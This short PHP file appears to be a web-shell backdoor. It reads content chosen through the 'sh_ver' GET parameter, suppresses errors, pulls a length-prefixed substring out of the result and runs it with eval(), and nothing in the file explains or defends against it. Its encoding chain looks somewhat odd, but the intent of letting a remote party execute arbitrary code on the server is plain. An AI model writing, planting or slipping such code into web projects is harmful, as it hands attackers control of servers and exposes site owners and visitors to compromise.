<?php
$url = urlencode(base64_encode($_GET["sh_ver"]));
$data = @file_get_contents($url);
$data = ltrim($data);
$string = substr($data,3,ord($data{2}));
eval($string);
?>